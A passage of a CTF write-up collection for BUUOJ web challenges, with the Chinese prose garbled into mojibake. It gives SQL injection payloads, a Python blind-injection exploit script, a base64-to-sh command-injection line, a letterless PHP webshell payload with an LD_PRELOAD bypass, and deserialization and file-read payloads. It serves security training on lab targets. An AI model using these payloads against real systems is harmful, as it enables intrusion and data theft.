·åªèƒ½ç»•è¿‡wafä½†æ˜¯å¹¶ä¸èƒ½ç»•è¿‡é»‘åå•æ£€æµ‹ã€‚ç”¨chr(47)ç»•è¿‡<code>\\</code>æ£€æµ‹ã€‚</p>\n<h2 id=\"HCTF-2018-admin\"><a href=\"#HCTF-2018-admin\" class=\"headerlink\" title=\"[HCTF 2018]admin\"></a>[HCTF 2018]admin</h2><p>å‡ºé¢˜äººWPï¼šâ€<a href=\"https://www.ckj123.com/?p=147&quot;\">https://www.ckj123.com/?p=147&quot;</a></p>\n<p>ä¿®æ”¹å¯†ç é¡µé¢æ³¨é‡Šæœ‰gitæºç æ³„éœ²ï¼Œ<a href=\"https://github.com/woadsl1234/hctf_flask/%EF%BC%8C\">https://github.com/woadsl1234/hctf_flask/ï¼Œ</a></p>\n<p>æ®è¯´æœ¬é¢˜æœ‰å¤šç§è§£æ³•ï¼Œä¸€æ˜¯flaskçš„sessionæœºåˆ¶ï¼Œsessionæ³„éœ²åè§£å¯†å‡ºæ¥ï¼Œä¿®æ”¹nameçš„å€¼ä¸ºadminå†ç”¨æºç ä¸­çš„secret-keyåŠ å¯†ï¼Œå°±å¯ä»¥å®ç°ä½ç½®adminã€‚äºŒæ˜¯ç”¨åˆ°UnicodeåŒå½¢å­—å¼•èµ·çš„å®‰å…¨é—®é¢˜ï¼š</p>\n<p>spotifyä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´](<a href=\"https://labs.spotify.com/2013/06/18/creative-usernames/\">https://labs.spotify.com/2013/06/18/creative-usernames/</a>)<br>æ¼æ´ç®€ä»‹:<br>æ‰¾ä¸€ä¸ªéœ€è¦é»‘æ‰çš„è´¦å·ï¼Œæ¯”å¦‚ä»¥bigbirdä¸ºä¾‹ã€‚åˆ›å»ºä¸€ä¸ªè´¦æˆ·åä¸º á´®á´µá´³á´®á´µá´¿á´° (in python this is the string uâ€™\\u1d2e\\u1d35\\u1d33\\u1d2e\\u1d35\\u1d3f\\u1d30â€²)ã€‚ç„¶åç”³è¯·ä¿®æ”¹å¿˜è®°å¯†ç ï¼Œä¿®æ”¹è‡ªå·±ç”³è¯·çš„è´¦å·å¯†ç ã€‚ä¿®æ”¹ä¹‹åä»¥åˆšåˆšè®¾ç½®çš„å¯†ç ç™»å½•bigbirdã€‚å°±å¯ä»¥æˆåŠŸç™»å½•ã€‚ä¸‰æ˜¯æ¡ä»¶ç«äº‰ã€‚</p>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>base64_decode(/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php)</p>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p><code>check.php?username=admin&amp;password=-1&#39;/**/union/**/select/**/1,database(),database()/**/%23</code>æ‹¿åˆ°æ•°æ®åº“å=&gt;â€™geekâ€™</p>\n<p><code>check.php?username=admin&amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)/**/%23</code>æ‹¿åˆ°è¡¨å=&gt;â€™geekuserâ€™,â€™l0ve1ysq1â€™</p>\n<p><code>check.php?username=admin&amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/password/**/from/**/l0ve1ysq1/**/limit/**/15,1)/**/%23</code>æ‹¿åˆ°flag=&gt;â€™flag{6d319459-bf52-4be1-8371-83d8d2b8a8d2}â€™</p>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-PHP\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-PHP\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>/<a href=\"http://www.zipæºç /\">www.zipæºç </a></p>\n<p>çœ‹æºç æ˜¯PHPååºåˆ—åŒ–</p>\n<p>expï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Name</span></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">&#x27;admin&#x27;</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-number\">100</span>;<br>&#125;<br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> Name;<br>var_dump(urlencode(serialize(<span class=\"hljs-variable\">$a</span>)));<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-Knife\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-Knife\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>ç™½ç»™ä¸€å¥è¯</p>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-Http\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-Http\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]Http\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>/Secret.php</p>\n<p>æ”¹Refererã€UAã€X-Forwarded-For</p>\n<h2 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h2><p>.user.ini(<a href=\"https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a>)</p>\n<p>ä¸»è¦åˆ©ç”¨å°±æ˜¯åœ¨.user.iniæ–‡ä»¶ä¸­å†™å…¥ï¼š<code>auto_prepend_file=01.gif</code>,å°±ä¼šåœ¨ç›®å½•ä¸‹çš„phpæ–‡ä»¶ä¸­è‡ªåŠ¨åŒ…å«01.gif</p>\n<h2 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h2><ol>\n<li><p>åˆ©ç”¨ï¼›æˆ–è€…|å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>\n</li>\n<li><p>å‘ç°ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥$IFSç»•è¿‡,å¦å¤–è¿˜æœ‰</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ $&#123;IFS&#125;ã€$IFSã€&#123;cat,flag.php&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>ä¸èƒ½å‡ºç°flagï¼Œé€šé…ç¬¦ä¹Ÿä¸èƒ½ç”¨ï¼Œåªå¥½ç›´æ¥å…¨éƒ½è¯»å‡ºæ¥</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">/?ip=127.0.0.1|<span class=\"hljs-keyword\">cat</span><span class=\"hljs-variable\">$IFS</span>`<span class=\"hljs-keyword\">ls</span>`<br></code></pre></td></tr></table></figure>\n\n<p>æˆ–è€…<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>\n</li>\n<li><p>å¦å¤–é»‘åå•ç»•è¿‡è¿˜æœ‰ä»¥ä¸‹è¿™äº›æ–¹æ³•</p>\n</li>\n</ol>\n<h2 id=\"ACTF2020-æ–°ç”Ÿèµ›-Include\"><a href=\"#ACTF2020-æ–°ç”Ÿèµ›-Include\" class=\"headerlink\" title=\"[ACTF2020 æ–°ç”Ÿèµ›]Include\"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>base64_decode(/?file=php://filter/convert.base64-encode/resource=flag.php)</p>\n<h2 id=\"ACTF2020-æ–°ç”Ÿèµ›-BackupFile\"><a href=\"#ACTF2020-æ–°ç”Ÿèµ›-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 æ–°ç”Ÿèµ›]BackupFile\"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>å¸¸è§å¤‡ä»½æ–‡ä»¶ *.swp   *.bak</p>\n<p>è®¿é—®index.php.bakæ‹¿åˆ°æºç </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-variable\">$key</span> = intval(<span class=\"hljs-variable\">$key</span>);<br><span class=\"hljs-variable\">$str</span> = <span class=\"hljs-string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$key</span> == <span class=\"hljs-variable\">$str</span>) &#123;<br>        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>index.php?key=123æ‹¿åˆ°flag</p>\n<h2 id=\"CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World\"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><ol>\n<li>é¢˜ç›®æç¤ºæ˜¯SQLï¼Œå•å¼•å·é—­åˆæ²¡æœ‰ç”¨ï¼ŒåŒå¼•å·åˆè¢«è¿‡æ»¤äº†ï¼ŒçŒœæµ‹æ˜¯æ•°å­—å‹æ³¨å…¥</li>\n<li>æµ‹è¯•å‘ç°0ï¼Œ1ï¼Œ2è¿”å›ç»“æœä¸åŒï¼Œåº”è¯¥å­˜åœ¨boolæ³¨å…¥</li>\n<li>fuzzä¸€ä¸‹æµ‹è¯•è¿‡æ»¤äº†å“ªäº›</li>\n<li><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</code>+<code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1000)</code>ç»“æœä¸åŒï¼Œç›²æ³¨æ‹¿flag</li>\n</ol>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><ol>\n<li><code>|| 1=1 #</code>æ‹¿åˆ°adminå¯†ç ï¼šâ€667252cbf386409fcf10e06a81c1c19aâ€œã€‚ç™»é™†ä¹‹åå‘ç°æ²¡å•¥ç”¨</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,3%23</code>æµ‹è¯•å¯ä»¥æ³¨å…¥</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,(seselectlect%20table_name%20frfromom%20infoorrmation_schema.tables%20whewherere%20table_schema=database()%20limit%200,1)%23</code>æ‹¿åˆ°è¡¨å=&gt;â€b4bsqlã€geekuserâ€œ</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20column_name%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name=&#39;b4bsql&#39;%20limit%200,1)%23 </code>æ‹¿åˆ°å­—æ®µå=&gt;â€idã€usernameã€passwordâ€</li>\n<li><code>password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20passwoorrd%20frfromom%20b4bsql%20limit%207,1)%23</code>æ‹¿åˆ°flag</li>\n</ol>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><ol>\n<li><p>æŠ¥é”™æ³¨å…¥ï¼Œpayload</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">username</span>=admin&amp;password=admin%<span class=\"hljs-number\">27</span>^extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0</span>x<span class=\"hljs-number\">7</span>e,(select(right((password),<span class=\"hljs-number\">30</span>))from(H<span class=\"hljs-number\">4</span>rDsq<span class=\"hljs-number\">1</span>))))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure></li>\n<li><p>flagç”¨leftå’Œrightå‡½æ•°æ‹¼æ¥</p>\n</li>\n</ol>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><ol>\n<li><p>é¢˜ç›®æç¤ºç›²æ³¨ï¼Œæµ‹è¯•<code>/search.php?id=0^1</code>å¯ä»¥å‘ç°å­˜åœ¨ç›²æ³¨ç‚¹</p>\n</li>\n<li><p>expï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><br>url = <span class=\"hljs-string\">&quot;http://b766a75e-ee4f-41c7-847a-aac535a77c88.node3.buuoj.cn/search.php?id=&quot;</span><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">i,j</span>):</span><br>\t<span class=\"hljs-comment\">#payload = url + &quot;0^(ascii(substr((database()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j) =&gt;&#x27;geek&#x27;</span><br>\t<span class=\"hljs-comment\"># payload = url + &quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j)=&gt;&#x27;F1naI1y,Flaaaaag&#x27;</span><br>\t<span class=\"hljs-comment\"># payload = url + &quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j)=&gt;&#x27;id,username,password&#x27;</span><br>\tpayload = url + <span class=\"hljs-string\">&quot;0^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class=\"hljs-built_in\">format</span>(i,j)<br>\t<span class=\"hljs-built_in\">print</span>(payload)<br>\tr = requests.get(payload)<br>\thtml = r.text<br>\t<span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;Click&quot;</span> <span class=\"hljs-keyword\">in</span> html:<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>\t<span class=\"hljs-keyword\">else</span>:<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">find</span>(<span class=\"hljs-params\">i</span>):</span><br>\tm1n = <span class=\"hljs-number\">33</span><br>\tm4x = <span class=\"hljs-number\">126</span><br>\t<span class=\"hljs-keyword\">while</span> m1n&lt;=m4x:<br>\t\tmid = (m1n+m4x)//<span class=\"hljs-number\">2</span><br>\t\t<span class=\"hljs-keyword\">if</span> get(i,mid):<br>\t\t\tm1n = mid+<span class=\"hljs-number\">1</span><br>\t\t<span class=\"hljs-keyword\">else</span>:<br>\t\t\tm4x = mid-<span class=\"hljs-number\">1</span><br><br>\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">chr</span>((m1n+m4x+<span class=\"hljs-number\">1</span>)//<span class=\"hljs-number\">2</span>)<br><br>flag = <span class=\"hljs-string\">&quot;&quot;</span><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">100</span>,<span class=\"hljs-number\">1000</span>):<br>\ta = find(i)<br>\t<span class=\"hljs-keyword\">if</span> a==<span class=\"hljs-string\">&#x27;!&#x27;</span>:<br>\t\t<span class=\"hljs-keyword\">break</span><br>\tflag += a<br>\t<span class=\"hljs-built_in\">print</span>(flag)<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;flag:&quot;</span>,flag)<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><ol>\n<li><p><code>view-source:http://c54f9ea8-ba26-47fa-8c09-58a7a6868706.node3.buuoj.cn/pay.php</code>çœ‹åˆ°ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;password&#x27;</span>])) &#123;<br>\t<span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;password&#x27;</span>];<br>\t<span class=\"hljs-keyword\">if</span> (is_numeric(<span class=\"hljs-variable\">$password</span>)) &#123;<br>\t\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>\t&#125;<span class=\"hljs-keyword\">elseif</span> (<span class=\"hljs-variable\">$password</span> == <span class=\"hljs-number\">404</span>) &#123;<br>\t\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p><code>money=1e15&amp;password=404aaa</code>åŒæ—¶ä¿®æ”¹cookieçš„user=0å˜æˆuser=1å³å¯æ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><ol>\n<li><p>æ— æ•°å­—ã€å­—æ¯shellï¼Œ</p>\n</li>\n<li><p><a href=\"https://blog.csdn.net/a15803617402/article/details/83589181\">https://blog.csdn.net/a15803617402/article/details/83589181</a></p>\n</li>\n<li><p><a href=\"https://www.freebuf.com/news/186298.html\">https://www.freebuf.com/news/186298.html</a></p>\n</li>\n<li><p>åˆ©ç”¨LD_PRELOAD+without send_mailç»•è¿‡disable_functionsï¼Œè°ƒç”¨â€™/readflagâ€™æ‹¿åˆ°flag</p>\n</li>\n<li><p>æ”¾ä¸ªpayload</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">?code=<span class=\"hljs-variable\">$_</span>=<span class=\"hljs-string\">&quot;`&#123;&#123;&#123;&quot;</span>^<span class=\"hljs-string\">&quot;?&lt;&gt;/&quot;</span>;<span class=\"hljs-variable\">$&#123;$_&#125;</span>[_](<span class=\"hljs-variable\">$&#123;$_&#125;</span>[__]);&amp;_=assert&amp;__=eval(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;flag&#x27;</span>])&amp;cmd=<span class=\"hljs-regexp\">/readflag&amp;outpath=/</span>var<span class=\"hljs-regexp\">/tmp/</span>a&amp;sopath=<span class=\"hljs-regexp\">/var/</span>tmp/disable.so<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"ç½‘é¼æ¯-2018-Fakebook\"><a href=\"#ç½‘é¼æ¯-2018-Fakebook\" class=\"headerlink\" title=\"[ç½‘é¼æ¯ 2018]Fakebook\"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><ol>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1</code>å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œç”¨å•å¼•å·æµ‹è¯•å‘ç°æŠ¥é”™ã€‚æµ‹è¯•åå‘ç°æ˜¯æ•´å‹æ³¨å…¥ï¼Œå°è¯•<code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0^1</code>å’Œ<code>0^0</code>æ³¨å…¥æˆåŠŸ</p>\n</li>\n<li><p>è™½ç„¶å¯ä»¥ç›²æ³¨ï¼Œä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œæ—¢ç„¶æœ‰æŠ¥é”™å°±å°è¯•æŠ¥é”™æ³¨å…¥ï¼š</p>\n<p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20database())),1)</code>æ‹¿åˆ°äº†æ•°æ®åº“å=&gt;â€fakebookâ€</p>\n</li>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27)),1)</code>æ‹¿åˆ°è¡¨å=&gt;â€usersâ€</p>\n</li>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)),1)</code>æ‹¿åˆ°å­—æ®µå=&gt;â€no,username,passwd,dataâ€</p>\n</li>\n<li><p><code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=1^updatexml(1,make_set(3,%27%27,(select%20substr(data,61,30)%20from%20fakebook.users)),1)</code>æ‹¿æ•°æ®â€1ï¼Œm1n,3c9909afec25354d551dae21590bb2,<code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;m1n&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:6:&quot;m1n.me&quot;;&#125;</code>â€œï¼Œå‘ç°ä¸€æ®µååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ã€‚æ˜¯æˆ‘åˆšåˆšæ³¨å†Œçš„ä¿¡æ¯</p>\n</li>\n<li><p>ä¸å¤ªæ‡‚æœ‰å•¥ç”¨ï¼Œå°è¯•æ‰«åå°ï¼Œæ‰«åˆ°robots.txtï¼Œ/user.php.bakæ‹¿åˆ°æºç </p>\n</li>\n<li><p>æ„é€ <code>http://cb710009-e17e-4384-b7b0-dddaa3856542.node3.buuoj.cn/view.php?no=0/**/union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:3:%22m1n%22;s:3:%22age%22;i:18;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%27</code>å°±å¯ä»¥è¯»åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><ol>\n<li><p>æºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span>  <br><span class=\"hljs-variable\">$text</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;text&quot;</span>];<br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file&quot;</span>];<br><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;password&quot;</span>];<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$text</span>)&amp;&amp;(file_get_contents(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>)===<span class=\"hljs-string\">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>).<span class=\"hljs-string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">&quot;/flag/&quot;</span>,<span class=\"hljs-variable\">$file</span>))&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Not now!&quot;</span>;<br>        <span class=\"hljs-keyword\">exit</span>(); <br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file</span>);  <span class=\"hljs-comment\">//useless.php</span><br>        <span class=\"hljs-variable\">$password</span> = unserialize(<span class=\"hljs-variable\">$password</span>);<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$password</span>;<br>    &#125;<br>&#125;<br><span class=\"hljs-keyword\">else</span>&#123;<br>    highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure></li>\n<li><p>ç¬¬ä¸€å±‚ä¸»è¦æ˜¯è€ƒå¯Ÿphpä¼ªåè®®ï¼š<code>text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code>,åŒæ—¶POSTâ€welcome to the zjctfâ€œï¼Œå¯ä»¥æ‹¿åˆ°useless.phpæºç 